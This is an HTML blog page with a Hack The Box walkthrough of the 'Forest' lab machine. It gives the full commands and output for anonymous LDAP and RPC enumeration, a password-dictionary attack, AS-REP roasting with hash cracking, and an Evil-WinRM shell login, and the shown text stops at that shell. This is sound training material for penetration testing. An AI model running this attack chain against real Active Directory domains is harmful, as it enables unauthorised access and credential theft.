@@ -1,0 +1,1117 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Hack The Box - Forest - DiegoExploit
+        
+    </title>
+    <style>
+  #carbonads {
+    border: 1px solid black;
+    border-radius: 7px;
+    border-spacing: 7px;
+    display: block;
+    overflow: hidden;
+    padding: 1em;
+    line-height: 1.5;
+  }
+  #carbonads span {
+    position: relative;
+    display: block;
+    overflow: hidden;
+  }
+  .carbon-img {
+    float: left;
+    margin-right: 1em;
+  }
+  .carbon-img img {
+    display: block;
+  }
+  .carbon-text {
+    display: block;
+    float: left;
+    max-width: calc(100% - 130px - 1em);
+    text-align: left;
+  }
+  .carbon-poweredby {
+    position: absolute;
+    left: 142px;
+    bottom: 0;
+    display: block;
+    font-size: .8em;
+    line-height: 1;
+    letter-spacing: 1px;
+    }
+    </style>
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-P385GSF');</script>
+<!-- End Google Tag Manager -->
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P385GSF"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+    <style>
+      #htbbadge{
+        float: left;
+      }
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="DiegoExploit" type="application/rss+xml">
+</head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>DiegoExploit</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+</ul>
+<h1 id="Categories Windows"><a href="#Categories Windows" class="headerlink" title="Categories Windows"></a>Categories Windows</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/legacy/">1. Hack The Box - Legacy</a></li>
+<li><a href="/hack-the-box/devel/">2. Hack The Box - Devel</a></li>
+<li><a href="/hack-the-box/optimum/">3. Hack The Box - Optimum</a></li>
+<li><a href="/hack-the-box/bastard/">4. Hack The Box - Bastard</a></li>
+<li><a href="/hack-the-box/artic/">5. Hack The Box - Artic</a></li>
+<li><a href="/hack-the-box/grandpa/">6. Hack The Box - Grandpa</a></li>
+<li><a href="/hack-the-box/granny/">7. Hack The Box - Granny</a></li>
+<li><a href="/hack-the-box/blue/">8. Hack The Box - Blue</a></li>
+<li><a href="/hack-the-box/silo/">9. Hack The Box - Silo</a></li>
+<li><a href="/hack-the-box/bounty/">10. Hack The Box - Bounty</a></li>
+<li><a href="/hack-the-box/jerry/">11. Hack The Box - Jerry</a></li>
+<li><a href="/hack-the-box/conceal/">12. Hack The Box - Conceal</a></li>
+<li><a href="/hack-the-box/chatterbox/">13. Hack The Box - Chatterbox</a></li>
+<li><a href="/hack-the-box/forest/">14. Hack The Box - Forest</a></li>
+<li><a href="/hack-the-box/bankrobber/">15. Hack The Box - BkRobber</a></li>
+<li><a href="/hack-the-box/secnotes/">16. Hack The Box - Secnotes</a></li>
+<li><a href="/hack-the-box/bastion/">17. Hack The Box - Bastion</a></li>
+
+
+</ul>
+<h1 id="Categories Linux"><a href="#Categories Linux" class="headerlink" title="Categories Linux"></a>Categories Linux</h1><h2 id="Hack-The-Box-"><a href="#Hack-The-Box-" class="headerlink" title="Hack The Box"></a>Hack The Box </h2><ul>
+<li><a href="/hack-the-box/lame/">1. Hack The Box - Lame</a></li>
+<li><a href="/hack-the-box/popcorn/">2. Hack The Box - Popcorn</a></li>
+<li><a href="/hack-the-box/beep/">3. Hack The Box - Beep</a></li>
+<li><a href="/hack-the-box/tenten/">4. Hack The Box - Tenten</a></li>
+<li><a href="/hack-the-box/cronos/">5. Hack The Box - Cronos</a></li>
+<li><a href="/hack-the-box/brainfuck/">6. Hack The Box - brainfuck</a></li>
+<li><a href="/hack-the-box/shocker/">6. Hack The Box - Shocker</a></li>
+<li><a href="/hack-the-box/bashed/">7. Hack The Box - Bashed</a></li>
+<li><a href="/hack-the-box/nibbles/">8. Hack The Box - Nibbles</a></li>
+<li><a href="/hack-the-box/nineveh/">9. Hack The Box - Nineveh</a></li>
+<li><a href="/hack-the-box/sense/">10. Hack The Box - Sense</a></li>
+<li><a href="/hack-the-box/solidstate/">11. Hack The Box - SolidState</a></li>
+<li><a href="/hack-the-box/kotarak/">12. Hack The Box - Kotarak</a></li>
+<li><a href="/hack-the-box/node/">13. Hack The Box - Node</a></li>
+<li><a href="/hack-the-box/valentine/">14. Hack The Box - Valentine</a></li>
+<li><a href="/hack-the-box/poison/">15. Hack The Box - Poison</a></li>
+<li><a href="/hack-the-box/sunday/">16. Hack The Box - Sunday</a></li>
+<li><a href="/hack-the-box/tartasauce/">17. Hack The Box - Tartasauce</a></li>
+<li><a href="/hack-the-box/friendzone/">18. Hack The Box - Friendzone</a></li>
+<li><a href="/hack-the-box/swagshop/">19. HTB- SwagShop</a></li>
+<li><a href="/hack-the-box/jarvis/">20. Hack The Box Jarvis</a></li>
+
+</ul>
+
+
+
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <br>
+  <h1 id="Hack-The-Box-Forest"><a href="#Hack-The-Box-Forest" class="headerlink" title="Hack The Box - Forest"></a>Hack The Box - Forest</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. Its IP address is <code>10.10.10.161</code> Let’s go to hack!!!<br><img src="/images/hackthebox/exploit/forest/0.png" alt=""></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2>
+<p>As always we will start with <code>nmap</code> to scan for open ports and services:
+
+<pre><figure class="highlight plain">  |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#nmap -p- --max-rate=1000 -T 4 -sC -sV 10.10.10.161
+ Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-24 12:28 EDT
+ Stats: 0:09:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+ SYN Stealth Scan Timing: About 45.95% done; ETC: 12:48 (0:10:46 remaining)
+ Nmap scan report for 10.10.10.161
+ Host is up (0.23s latency).
+ Not shown: 65511 closed ports
+ PORT      STATE SERVICE      VERSION
+ 53/tcp    open  domain?
+ | fingerprint-strings:
+ |   DNSVersionBindReqTCP:
+ |     version
+ |_    bind
+ 88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-24 17:00:34Z)
+ 135/tcp   open  msrpc        Microsoft Windows RPC
+ 139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+ 389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+ 445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+ 464/tcp   open  kpasswd5?
+ 593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+ 636/tcp   open  tcpwrapped
+ 3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+ 3269/tcp  open  tcpwrapped
+ 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ |_http-server-header: Microsoft-HTTPAPI/2.0
+ |_http-title: Not Found
+ 9389/tcp  open  mc-nmf       .NET Message Framing
+ 47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+ |_http-server-header: Microsoft-HTTPAPI/2.0
+ |_http-title: Not Found
+ 49664/tcp open  msrpc        Microsoft Windows RPC
+ 49665/tcp open  msrpc        Microsoft Windows RPC
+ 49666/tcp open  msrpc        Microsoft Windows RPC
+ 49667/tcp open  msrpc        Microsoft Windows RPC
+ 49671/tcp open  msrpc        Microsoft Windows RPC
+ 49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+ 49677/tcp open  msrpc        Microsoft Windows RPC
+ 49684/tcp open  msrpc        Microsoft Windows RPC
+ 49706/tcp open  msrpc        Microsoft Windows RPC
+ 49903/tcp open  msrpc        Microsoft Windows RPC
+ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+ SF-Port53-TCP:V=7.80%I=7%D=6/24%Time=5EF3840D%P=x86_64-pc-linux-gnu%r(DNSV
+ SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+ SF:x04bind\0\0\x10\0\x03");
+ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+ 
+ Host script results:
+ |_clock-skew: mean: 2h31m23s, deviation: 4h02m31s, median: 11m21s
+ | smb-os-discovery:
+ |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+ |   Computer name: FOREST
+ |   NetBIOS computer name: FOREST\x00
+ |   Domain name: htb.local
+ |   Forest name: htb.local
+ |   FQDN: FOREST.htb.local
+ |_  System time: 2020-06-24T10:02:59-07:00
+ | smb-security-mode:
+ |   account_used: <blank>
+ |   authentication_level: user
+ |   challenge_response: supported
+ |_  message_signing: required
+ | smb2-security-mode:
+ |   2.02:
+ |_    Message signing enabled and required
+ | smb2-time:
+ |   date: 2020-06-24T17:02:58
+ |_  start_date: 2020-06-24T14:01:26
+ 
+ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+ Nmap done: 1 IP address (1 host up) scanned in 1547.61 seconds</figure></pre>
+ <p>The result show a windows server as domain controller, the domain is <code>htb.local</code>.
+ <h2 id="Enumeration"><a href="#Enumeration" class="Enumeration" title="Enumeration"></a>Enumeration</h2>
+ <p>Enumerate the domain controller with differents tools. With <code>ldapsearch</code> could find different information as policies and users.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' > person.out
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#cat person.out | more
+ # extended LDIF
+ #
+ # LDAPv3
+ # base <DC=htb,DC=local> with scope subtree
+ # filter: (objectClass=Person)
+ # requesting: ALL
+ #
+ 
+ # Guest, Users, htb.local
+ dn: CN=Guest,CN=Users,DC=htb,DC=local
+ objectClass: top
+ objectClass: person
+ objectClass: organizationalPerson
+ objectClass: user
+ cn: Guest
+ description: Built-in account for guest access to the computer/domain
+ distinguishedName: CN=Guest,CN=Users,DC=htb,DC=local
+ instanceType: 4
+ whenCreated: 20190918174557.0Z
+ whenChanged: 20190918174557.0Z
+ uSNCreated: 8197
+ memberOf: CN=Guests,CN=Builtin,DC=htb,DC=local
+ uSNChanged: 8197
+ name: Guest
+ objectGUID:: 3cHbrmUFAEi25kbTT5W9gA==
+ userAccountControl: 66082
+ badPwdCount: 0
+ codePage: 0
+ countryCode: 0
+ badPasswordTime: 0
+ lastLogoff: 0
+ lastLogon: 0
+ pwdLastSet: 0
+ primaryGroupID: 514
+ objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNP9QEAAA==
+ accountExpires: 9223372036854775807
+ logonCount: 0
+ sAMAccountName: Guest
+ sAMAccountType: 805306368
+ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
+ isCriticalSystemObject: TRUE
+ dSCorePropagationData: 20200624193758.0Z
+ dSCorePropagationData: 20200624193758.0Z
+ dSCorePropagationData: 20200624193758.0Z
+ dSCorePropagationData: 20200624193758.0Z
+ dSCorePropagationData: 16010101000000.0Z
+ 
+ # Santi Rodriguez, Developers, Information Technology, Employees, htb.local
+ dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
+  =htb,DC=local
+ objectClass: top
+ objectClass: person
+ objectClass: organizationalPerson
+ objectClass: user
+ cn: Santi Rodriguez
+ sn: Rodriguez
+ givenName: Santi
+ distinguishedName: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,
+  OU=Employees,DC=htb,DC=local
+ instanceType: 4
+ whenCreated: 20190920230255.0Z
+ whenChanged: 20190920230255.0Z
+ displayName: Santi Rodriguez
+ uSNCreated: 28837
+ uSNChanged: 28843
+ name: Santi Rodriguez
+ objectGUID:: VSlmUT29FkGHUAJ12EnggA==
+ userAccountControl: 66048
+ badPwdCount: 0
+ codePage: 0
+ countryCode: 0
+ badPasswordTime: 0
+ lastLogoff: 0
+ lastLogon: 0
+ pwdLastSet: 132134941751348277
+ primaryGroupID: 513
+ objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPgAQAAA==
+ accountExpires: 9223372036854775807
+ logonCount: 0
+ sAMAccountName: santi
+ sAMAccountType: 805306368
+ userPrincipalName: santi@htb.local
+ objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
+ dSCorePropagationData: 20200624193801.0Z
+ dSCorePropagationData: 20200624193801.0Z
+ dSCorePropagationData: 20200624193801.0Z
+ dSCorePropagationData: 20200624193801.0Z
+ dSCorePropagationData: 16010101000000.0Z
+ 
+ # search reference
+ ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local
+ 
+ # search reference
+ ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local
+ 
+ # search reference
+ ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local
+ 
+ # search result
+ search: 2
+ result: 0 Success
+ 
+ # numResponses: 34
+ # numEntries: 30
+ # numReferences: 3 </figure></pre>
+ <p>The output show data as the <code>pwdLastSet</code>, this code needs to conver from ldap to human online, the result is the date <code> Friday 20 Septmebre 2019 23:02:55</code>
+  <img src="/images/hackthebox/exploit/forest/2.png" alt=""></p>
+ <p>Enumerate users.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName
+ # requesting: sAMAccountName
+ sAMAccountName: Guest
+ sAMAccountName: DefaultAccount
+ sAMAccountName: FOREST$
+ sAMAccountName: EXCH01$
+ sAMAccountName: $331000-VK4ADACQNUCA
+ sAMAccountName: SM_2c8eef0a09b545acb
+ sAMAccountName: SM_ca8c2ed5bdab4dc9b
+ sAMAccountName: SM_75a538d3025e4db9a
+ sAMAccountName: SM_681f53d4942840e18
+ sAMAccountName: SM_1b41c9286325456bb
+ sAMAccountName: SM_9b69f1b9d2cc45549
+ sAMAccountName: SM_7c96b981967141ebb
+ sAMAccountName: SM_c75ee099d0a64c91b
+ sAMAccountName: SM_1ffab36a2f5f479cb
+ sAMAccountName: HealthMailboxc3d7722
+ sAMAccountName: HealthMailboxfc9daad
+ sAMAccountName: HealthMailboxc0a90c9
+ sAMAccountName: HealthMailbox670628e
+ sAMAccountName: HealthMailbox968e74d
+ sAMAccountName: HealthMailbox6ded678
+ sAMAccountName: HealthMailbox83d6781
+ sAMAccountName: HealthMailboxfd87238
+ sAMAccountName: HealthMailboxb01ac64
+ sAMAccountName: HealthMailbox7108a4e
+ sAMAccountName: HealthMailbox0659cc1
+ sAMAccountName: sebastien
+ sAMAccountName: lucinda
+ sAMAccountName: andy
+ sAMAccountName: mark
+ sAMAccountName: santi</figure></pre>
+ <p>Deleting information not necesary
+<pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}'
+ requesting:
+ Guest
+ DefaultAccount
+ FOREST$
+ EXCH01$
+ $331000-VK4ADACQNUCA
+ SM_2c8eef0a09b545acb
+ SM_ca8c2ed5bdab4dc9b
+ SM_75a538d3025e4db9a
+ SM_681f53d4942840e18
+ SM_1b41c9286325456bb
+ SM_9b69f1b9d2cc45549
+ SM_7c96b981967141ebb
+ SM_c75ee099d0a64c91b
+ SM_1ffab36a2f5f479cb
+ HealthMailboxc3d7722
+ HealthMailboxfc9daad
+ HealthMailboxc0a90c9
+ HealthMailbox670628e
+ HealthMailbox968e74d
+ HealthMailbox6ded678
+ HealthMailbox83d6781
+ HealthMailboxfd87238
+ HealthMailboxb01ac64
+ HealthMailbox7108a4e
+ HealthMailbox0659cc1
+ sebastien
+ lucinda
+ andy
+ mark
+ santi</figure></pre>
+ <p>Saving the output in a file.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName |grep sAMAccountName  | awk '{print $2}' >userlist.ldap </figure></pre>
+  <p>Another tool is <code>windapsearch.py</code>, this tool could be help us to find util data.
+  <img src="/images/hackthebox/exploit/forest/1.png" alt=""></p>
+ <p>Tool rpcclient with anonymous authentication reveal the user <code>svc-alfresco</code>
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#
+ 
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#rpcclient -U "" 10.10.10.161
+ Enter WORKGROUP\'s password:
+ rpcclient $> enumdomuser
+ command not found: enumdomuser
+ rpcclient $> enumdomusers
+ user:[Administrator] rid:[0x1f4]
+ user:[Guest] rid:[0x1f5]
+ user:[krbtgt] rid:[0x1f6]
+ user:[DefaultAccount] rid:[0x1f7]
+ user:[$331000-VK4ADACQNUCA] rid:[0x463]
+ user:[SM_2c8eef0a09b545acb] rid:[0x464]
+ user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+ user:[SM_75a538d3025e4db9a] rid:[0x466]
+ user:[SM_681f53d4942840e18] rid:[0x467]
+ user:[SM_1b41c9286325456bb] rid:[0x468]
+ user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+ user:[SM_7c96b981967141ebb] rid:[0x46a]
+ user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+ user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+ user:[HealthMailboxc3d7722] rid:[0x46e]
+ user:[HealthMailboxfc9daad] rid:[0x46f]
+ user:[HealthMailboxc0a90c9] rid:[0x470]
+ user:[HealthMailbox670628e] rid:[0x471]
+ user:[HealthMailbox968e74d] rid:[0x472]
+ user:[HealthMailbox6ded678] rid:[0x473]
+ user:[HealthMailbox83d6781] rid:[0x474]
+ user:[HealthMailboxfd87238] rid:[0x475]
+ user:[HealthMailboxb01ac64] rid:[0x476]
+ user:[HealthMailbox7108a4e] rid:[0x477]
+ user:[HealthMailbox0659cc1] rid:[0x478]
+ user:[sebastien] rid:[0x479]
+ user:[lucinda] rid:[0x47a]
+ user:[svc-alfresco] rid:[0x47b]
+ user:[andy] rid:[0x47e]
+ user:[mark] rid:[0x47f]
+ user:[santi] rid:[0x480]</figure></pre>
+ <p>Enumerate user <code>svc-alfresco</code>:<br>
+ <p>1.) To know the groups to which the user belongs: queryusergroups 0x47b.<br>
+ <p>2.) To know the name group: querygroup 0x201, 0x47c.<br>
+  <img src="/images/hackthebox/exploit/forest/3.png" alt=""></p>
+  <p>Run the <code>crackmapexec</code> for look differents poilicies, in this case, the password complexity and lenght.
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |                                                                                                                                                                                                                                          
+ |-->{SFire129}#crackmapexec smb 10.10.10.161 --pass-pol
+ [*] First time use detected
+ [*] Creating home directory structure
+ [*] Creating default workspace
+ [*] Initializing SMB protocol database
+ [*] Initializing SSH protocol database
+ [*] Initializing WINRM protocol database
+ [*] Initializing MSSQL protocol database
+ [*] Copying default configuration file
+ [*] Generating SSL certificate
+ SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+ SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
+ SMB         10.10.10.161    445    FOREST           Minimum password length: 7
+ SMB         10.10.10.161    445    FOREST           Password history length: 24
+ SMB         10.10.10.161    445    FOREST           Maximum password age: 
+ SMB         10.10.10.161    445    FOREST           
+ SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
+ SMB         10.10.10.161    445    FOREST               Domain Refuse Password Change: 0
+ SMB         10.10.10.161    445    FOREST               Domain Password Store Cleartext: 0
+ SMB         10.10.10.161    445    FOREST               Domain Password Lockout Admins: 0
+ SMB         10.10.10.161    445    FOREST               Domain Password No Clear Change: 0
+ SMB         10.10.10.161    445    FOREST               Domain Password No Anon Change: 0
+ SMB         10.10.10.161    445    FOREST               Domain Password Complex: 0
+ SMB         10.10.10.161    445    FOREST           
+ SMB         10.10.10.161    445    FOREST           Minimum password age: 
+ SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
+ SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
+ SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
+ SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set</figure></pre>
+ <p>In this point we have users, maybe with a dictionary attack will be possible to crack, the next is an example to create a dictionary, and then, run the attack.
+ <p>1.) Create a dictionary.txt with most common words about the target.<br>
+ <p>2.) Add the year, for example 2019, 2020 <code>for i in $(cat dictionary.txt); do echo $i; echo ${i}2019; echo ${i}2020; done > dictionary.txt</code></br>
+ <p>3.) With Hashcat add differents rules to passwords, <code>D:\hashcat-6.0.0>hashcat.exe --force --stdout dictionary.txt -r d:\hashcat-6.0.0\rules\best64.rule -r d:\hashcat-6.0.0\rules\toggles1.rule > dictionary2.txt</code><br>
+ <p>4.) Extract the words with size 8, <code>cat dictionary2.txt | sort -u | awk 'length($0) > 8' | wc -l > dictionary2.txt</code>.<br>
+ <p>5.) Run the dictionary attack against the AD <code>crackmapexec smb 10.10.10.161 -u userslist.ldap -p dictionary2.txt</code><br>
+  <img src="/images/hackthebox/exploit/forest/6.png" alt=""></p>
+ <p>Try to extract the hash with <code>getNPUsers.py</code> tool. The output reveal the hash from user <code>svc-alfresco</code>.
+ 
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+|
+|-->{SFire129}#GetNPUsers.py -dc-ip 10.10.10.161 -request 'htb.local/'
+Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-06-24 17:20:33.398912  2020-06-24 14:11:27.751767  0x410200
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b0851b1178550aa466d45925b4539b2b$4e8b70787e7e9b05616aeb3d3287752d0afc26a029fd5f7543ba3807079d2af3b
+3f44e0b0687c8a6a15eea20aee3b8531737dbd5dd9fb22fd9989302cbc80845d69bf6151839d0975bcbb243124154d7f1c532d2c80130db005bee8008fe9dd9aaf499a1
+214c3d6040d22ea8de17df21780b9d01e623ffe00e225146cbdfcee1dd4caf4bf95fc271cb7149cb09f02bb603ea873bd4ae0df3c79baaec7eff6f52fb450ec57297a3c
+0bab219796cc6b21ef77751f2b6c9d95761d5145b0247e923c789e82feeed95dab2b41f69fb551963cec9a2529e29bfa5bdff375d1ac6c03ee2747dbb6283</figure></pre>
+<p>Run the <code>john</code> for decrypt the password hash. The pasword user svc-alfresco is s3rvice.
+ <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#john --wordlist=/usr/share/john/password.lst --rules= hash
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+ Will run 4 OpenMP threads
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+ 0g 0:00:00:00 DONE (2020-06-24 14:11) 0g/s 505954p/s 505954c/s 505954C/s Xxxing..Sssing
+ Session completed
+ |-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#john --wordlist=/usr/share/wordlists/rockyou.txt --forma=krb5asrep  hash
+ Using default input encoding: UTF-8
+ Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+ Will run 4 OpenMP threads
+ Press 'q' or Ctrl-C to abort, almost any other key for status
+ s3rvice          (?)
+ 1g 0:00:00:06 DONE (2020-06-24 14:14) 0.1607g/s 656874p/s 656874c/s 656874C/s s401447401447401447..s3r2s1
+ Use the "--show" option to display all of the cracked passwords reliably
+ Session completed </figure></pre>
+ <p>Connect to server and enumerate the share folder with <code>crackmapexec</code>
+  <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
+ SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+ SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
+ SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
+ SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
+ SMB         10.10.10.161    445    FOREST           -----           -----------     ------
+ SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
+ SMB         10.10.10.161    445    FOREST           C$                              Default share
+ SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
+ SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share
+ SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share</figure></pre>
+ <p>Locate the <code>evil-winrm.rb</code> and connect to AD server with credentials found it.
+   <pre><figure class="highlight plain"> |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#locate evil-winrm.rb
+ /var/lib/gems/2.7.0/gems/evil-winrm-2.3/lib/evil-winrm.rb
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#cp 
+ cp: missing file operand
+ Try 'cp --help' for more information.
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#cp /var/lib/gems/2.7.0/gems/evil-winrm-2.3/lib/evil-winrm.rb .
+ |-------(root@kali)-------|(~/HackTheBox/forest)
+ |
+ |-->{SFire129}#ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice                                                                                                                                                               
+ 
+ Evil-WinRM shell v2.3
+ 
+ Info: Establishing connection to remote endpoint
+ 
+ *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ipconfig
+ 
+ Windows IP Configuration
+ 
+ 
+ Ethernet adapter Ethernet0:
+ 
+    Connection-specific DNS Suffix  . :
+    IPv4 Address. . . . . . . . . . . : 10.10.10.161
+    Subnet Mask . . . . . . . . . . . : 255.255.255.0
+    Default Gateway . . . . . . . . . : 10.10.10.2
+ 
+ Tunnel adapter isatap.{E00B7E21-EE8E-4210-8C23-A108EFC92167}:
+ 
+    Media State . . . . . . . . . . . : Media disconnected
